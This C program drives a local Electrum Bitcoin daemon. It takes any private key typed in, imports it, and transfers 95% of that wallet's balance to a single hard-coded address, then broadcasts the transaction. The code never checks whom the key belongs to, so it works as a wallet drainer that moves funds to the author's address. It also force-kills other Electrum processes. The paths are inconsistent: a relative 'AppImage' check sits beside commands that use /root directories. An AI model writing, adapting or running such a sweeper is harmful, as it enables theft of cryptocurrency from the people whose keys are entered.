#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <json-c/json.h>

#define MY_ADDRESS "3989LYRH3bauPigYs8HSTAg8kGGNHtvgjF"
#define PERCENTAGE 0.95
#define ELECTRUM_PATH "../Electrum-4.4.6/electrum"

void start_electrum_daemon()
{
    char cmd[512];
    // Kill any existing Electrum processes first
    system("pkill -f electrum");
    sleep(1);
    
    // Use absolute paths
    snprintf(cmd, sizeof(cmd), "cd /root/Electrum-4.4.6 && PYTHONPATH=/root/Electrum-4.4.6 python3 -m electrum daemon -d");
    system(cmd);
    sleep(2);
    
    snprintf(cmd, sizeof(cmd), "cd /root/Electrum-4.4.6 && PYTHONPATH=/root/Electrum-4.4.6 python3 -m electrum daemon setconfig rpcport 7777");
    system(cmd);
    
    snprintf(cmd, sizeof(cmd), "cd /root/Electrum-4.4.6 && PYTHONPATH=/root/Electrum-4.4.6 python3 -m electrum daemon load_wallet");
    system(cmd);
    sleep(1);

    // Verify daemon is running
    snprintf(cmd, sizeof(cmd), "cd /root/Electrum-4.4.6 && PYTHONPATH=/root/Electrum-4.4.6 python3 -m electrum daemon status");
    system(cmd);
}

struct Response
{
    char *data;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct Response *resp = (struct Response *)userp;
    char *ptr = realloc(resp->data, resp->size + realsize + 1);
    if(ptr == NULL) {
        printf("Error: Out of memory\n");
        return 0;
    }
    resp->data = ptr;
    memcpy(&(resp->data[resp->size]), contents, realsize);
    resp->size += realsize;
    resp->data[resp->size] = 0;
    return realsize;
}

double get_balance(CURL *curl)
{
    struct Response resp = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    char json[512] = "{\"id\":\"1\",\"method\":\"getbalance\",\"params\":[]}";

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

    CURLcode res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        printf("Error: Failed to get balance\n");
        curl_slist_free_all(headers);
        free(resp.data);
        return 0.0;
    }

    struct json_object *parsed_json = json_tokener_parse(resp.data);
    if(parsed_json == NULL) {
        printf("Error: Failed to parse JSON response\n");
        curl_slist_free_all(headers);
        free(resp.data);
        return 0.0;
    }

    struct json_object *result;
    if(!json_object_object_get_ex(parsed_json, "result", &result)) {
        printf("Error: No 'result' field in response\n");
        json_object_put(parsed_json);
        curl_slist_free_all(headers);
        free(resp.data);
        return 0.0;
    }

    double balance = json_object_get_double(result);

    free(resp.data);
    curl_slist_free_all(headers);
    json_object_put(parsed_json);

    return balance;
}

void make_transfer(CURL *curl, const char *amount)
{
    struct Response resp = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    char json[512];
    snprintf(json, sizeof(json),
             "{\"id\":\"1\",\"method\":\"payto\",\"params\":[\"%s\", \"%s\"]}",
             MY_ADDRESS, amount);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK)
    {
        printf("Transfer response: %s\n", resp.data);
        
        // Create and broadcast the transaction
        struct Response broadcast_resp = {0};
        struct curl_slist *broadcast_headers = curl_slist_append(NULL, "Content-Type: application/json");
        
        struct json_object *parsed_json = json_tokener_parse(resp.data);
        struct json_object *result;
        if(json_object_object_get_ex(parsed_json, "result", &result)) {
            char broadcast_json[512];
            snprintf(broadcast_json, sizeof(broadcast_json),
                     "{\"id\":\"1\",\"method\":\"broadcast\",\"params\":[\"%s\"]}",
                     json_object_get_string(result));

            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, broadcast_json);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, broadcast_headers);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&broadcast_resp);

            CURLcode broadcast_res = curl_easy_perform(curl);
            if (broadcast_res == CURLE_OK)
            {
                printf("Broadcast response: %s\n", broadcast_resp.data);
            }
            free(broadcast_resp.data);
            curl_slist_free_all(broadcast_headers);
        }
        json_object_put(parsed_json);
    }
    else
    {
        printf("Error: Transfer failed\n");
    }

    free(resp.data);
    curl_slist_free_all(headers);
}

int main()
{
    // Check if Electrum AppImage exists
    if (access(ELECTRUM_PATH, F_OK) != 0) {
        printf("Error: Electrum AppImage not found at %s\n", ELECTRUM_PATH);
        printf("Please make sure the AppImage is in the same directory as this program\n");
        return 1;
    }

    start_electrum_daemon();
    printf("Daemon started. Waiting for initialization...\n");
    sleep(3); // Give more time for daemon to fully initialize

    CURL *curl;
    char private_key[100];

    printf("Enter private key: ");
    fgets(private_key, sizeof(private_key), stdin);
    private_key[strcspn(private_key, "\n")] = 0;

    curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:7777");

        // Import private key
        struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
        char json[512];
        snprintf(json, sizeof(json),
                 "{\"id\":\"1\",\"method\":\"importprivkey\",\"params\":[\"%s\"]}",
                 private_key);

        struct Response resp = {0};
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK)
        {
            double balance = get_balance(curl);
            printf("Current balance: %.8f BTC\n", balance);
            
            if(balance > 0) {
                char amount[20];
                snprintf(amount, sizeof(amount), "%.8f", balance * PERCENTAGE);
                printf("Attempting to transfer %.8f BTC\n", balance * PERCENTAGE);
                make_transfer(curl, amount);
            } else {
                printf("No balance available for transfer\n");
            }
        }
        else {
            printf("Error: Could not connect to Electrum daemon\n");
        }

        free(resp.data);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    return 0;
}
